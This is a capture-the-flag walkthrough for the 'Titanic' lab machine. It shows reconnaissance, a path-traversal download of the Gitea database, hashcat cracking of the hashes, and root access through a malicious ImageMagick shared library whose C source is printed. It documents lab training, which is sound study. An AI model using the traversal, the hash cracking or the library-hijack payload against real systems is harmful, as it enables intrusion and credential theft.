# 🛳️Titanic CTF - Walkthrough

## 🕵️‍♂️ Initial Reconnaissance

The first thing I did was a network scan with **nmap** to identify open ports and active services.

```bash
nmap -sC -sV -A 10.10.11.55
```

The output didn't reveal anything particularly interesting, so I decided to analyze the main website. After a manual inspection without success, I performed a scan with **Gobuster** to look for subdomains.

```bash
gobuster dns -d titanic.htb -w common.txt
```

Thanks to this scan, I found a subdomain called `dev`.

Visiting `dev.<target>`, I discovered that it was an instance of **Gitea**, a platform similar to GitHub for code versioning. Exploring the public repository, I identified a user called `developer`, which could be interesting.

Scrolling through the uploaded files, I found configuration files, one related to **Gitea** and another to **MySQL**.

## 📂 Database Access

I tried to connect directly to MySQL, but the port was not open. However, by consulting the Gitea documentation, I discovered that the `gitea.db` database is located at `data/gitea`. I tried to download it with **curl**:

```bash
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Opening the database with **sqlite3**, I found the `user` table containing password hashes.

```bash
sqlite3 gitea.db
sqlite> .tables
sqlite> SELECT name, passwd, salt FROM user;
```

The password hash was in a specific Gitea format. To decode it into a format readable by **hashcat**, I used a Python script found on GitHub ([gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)).

After conversion, I launched **hashcat** to perform a brute-force attack using the `rockyou.txt` wordlist.

```bash
hashcat -m 10900 hash.txt rockyou.txt
```

After a few minutes, I found the password: **25282528**.

## 🔑 SSH Access and User Flag

Now that I have a valid password, I tried to access the `developer` user via SSH:

```bash
ssh developer@10.10.11.55
```

Once inside, I explored the user's home directory and found the **user flag**!

```bash
cat user.txt
```

## 🚀 Privilege Escalation

To gain root privileges, I started by checking `sudo` permissions:

```bash
sudo -l
```

Unfortunately, I found no commands executable without a password. I then explored the system looking for interesting files or processes.

After some searching, I found a file that uses a vulnerable version of **ImageMagick**.

## 🎨 ImageMagick Exploit

To exploit the ImageMagick vulnerability, I used an approach based on a malicious shared library. In practice, ImageMagick dynamically loads some libraries during image processing, and we can leverage this feature to execute arbitrary code.

### 🛠 Payload Creation

I created a shared library (`libxcb.so.1`) containing malicious code that copies the `root.txt` file to `/tmp/root.txt`. I compiled the file with the following command:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

### 📌 Exploit Execution

Once ImageMagick processed this malicious file, the code within the **constructor** (`__attribute__((constructor))`) was automatically executed. This allowed the content of `root.txt` to be copied to the `/tmp` directory, making it readable.

Alternatively, I could have embedded a **reverse shell** in the same payload to gain interactive access to the machine as the root user.

## 🎯 Conclusion

This machine required a mix of **reconnaissance**, **Gitea exploit**, **hash cracking**, and **privilege escalation via ImageMagick** techniques. It was an interesting challenge that tested various skills. 🚀